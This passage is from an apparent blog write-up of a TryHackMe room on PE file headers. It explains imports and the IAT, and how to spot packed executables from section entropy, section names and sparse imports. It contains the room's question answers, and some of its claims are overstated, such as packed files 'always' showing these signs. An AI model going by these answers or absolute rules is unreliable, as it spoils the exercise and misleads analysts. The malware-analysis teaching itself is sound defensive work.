<li><strong>OriginalFirstThunk</strong> is an array of pointers to IMAGE_THUNK_DATA structures containing references to imported function names or ordinals, used by the OS loader during dynamic linking of a PE file.</li> <li><strong>FirstThunk</strong> is an array of pointers within the Import Descriptor table of a PE file, initially populated with the same values as <code class="language-plaintext highlighter-rouge">OriginalFirstThunk</code> and later updated with resolved function addresses during dynamic linking.</li> <li>The <strong>Import Address Table (IAT)</strong> is a data structure used by the operating system to store the resolved addresses of imported functions from external DLLs, facilitating dynamic linking in a PE file.</li> </ul> <p>By studying imports of the PE file, we can learn a lot about what activities it might perform.</p> <h3 id="questions-4">Questions</h3> <p><strong>The PE file Desktop\Samples\redline imports the function CreateWindowExW. From which dll file does it import this function?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">USER32.dll</code></em></p> <h2 id="task-8---packing-and-identifying-packed-executables">Task 8 - Packing and Identifying packed executables</h2> <p>Because PE file’s information can be easily read, packers obfuscate the data in a PE file in a way that it can’t be read without unpacking it. The unpacking process is ran when the PE file is executed. This is done in order to prevent program’s static reverse engineering.</p> <h3 id="from-section-headers">From Section Headers</h3> <p>In previous task, we have seen that sections are commonly named <code class="language-plaintext highlighter-rouge">.text</code>, <code class="language-plaintext highlighter-rouge">.data</code> and <code class="language-plaintext highlighter-rouge">.rsrc</code>. When looking at the file <em>zmsuz3pinwl</em>, we can see there is some unconventional names.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/ByOwr9BWA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="zmsuz3pinwl Sections" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Using <code class="language-plaintext highlighter-rouge">pecheck</code>:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
 entropy: 7.999788 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
 entropy: 7.961048 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
 entropy: 7.554513 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
.rsrc entropy: 6.938747 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
 entropy: 0.000000 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
.data entropy: 7.866646 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
.adata entropy: 0.000000 <span class="o">(</span><span class="nv">Min</span><span class="o">=</span>0.0, <span class="nv">Max</span><span class="o">=</span>8.0<span class="o">)</span>
...
<span class="o">[</span>IMAGE_SECTION_HEADER]
0x1F0      0x0   Name:                          
0x1F8      0x8   Misc:                          0x3F4000  
0x1F8      0x8   Misc_PhysicalAddress:          0x3F4000  
0x1F8      0x8   Misc_VirtualSize:              0x3F4000  
0x1FC      0xC   VirtualAddress:                0x1000    
0x200      0x10  SizeOfRawData:                 0xD3400
</code></pre></div></div> <p>When checking the Entropy of <em>.data</em> and three of the four unnamed section, it is high, approaching 8. This means there is a high level in randomness in data and confirms our toughts about this is indicating a packed executable.<br/> Also, these sections has the <em>EXECUTE</em> permissions, which means there is many data parts and the depacking code in one of the sections.</p> <p>Another valuable piece information is that in packed executable, <code class="language-plaintext highlighter-rouge">SizeOfRawData</code> is always smaller than <code class="language-plaintext highlighter-rouge">Misc_VirtualSize</code> because unpacking process makes the section significantly larger.</p> <h3 id="from-import-functions">From Import functions</h3> <p>When looking into import functions, packed executables only imports the libraries needed to unpack the program like <code class="language-plaintext highlighter-rouge">LoadLibraryA</code>…</p> <p>To sum up, a packed executable will always have one of these indications:</p> <ul> <li>Unconventional section names</li> <li>EXECUTE permissions for multiple sections</li> <li>High Entropy, approaching 8, for some sections.</li> <li>A significant difference between SizeOfRawData and Misc_VirtualSize of some PE sections</li> <li>Very few import functions</li> </ul> <h3 id="questions-5">Questions</h3> <p><strong>Which of the files in the attached VM in the directory Desktop\Samples seems to be a packed executable?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">zmsuz3pinwl</code></em></p> <h2 id="task-9---conclusion">Task 9 - Conclusion</h2> <p>This room provided a detailed overview of Portable Executable (PE) file headers, focusing on their role in analyzing Windows executable files. Key topics covered included:</p> <ul> <li>Understanding the structure of PE files and their headers like IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, and others.</li> <li>Learning to interpret critical information stored in these headers, such as machine architecture, compilation timestamp, entry point address, section details, and import libraries.</li> <li>Exploring methods for identifying packed executables through unconventional section names, high entropy values, and minimal import functions.</li> </ul> <p>Using tools like pe-tree and wxHexEditor, analysts can efficiently dissect PE files, spot potential malware indicators, and gain insights into executable behavior. This knowledge is crucial for professionals involved in malware analysis and Windows security.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Malware Analysis"/><category term="RE"/><category term="Static Analysis"/><category term="Windows"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry></feed>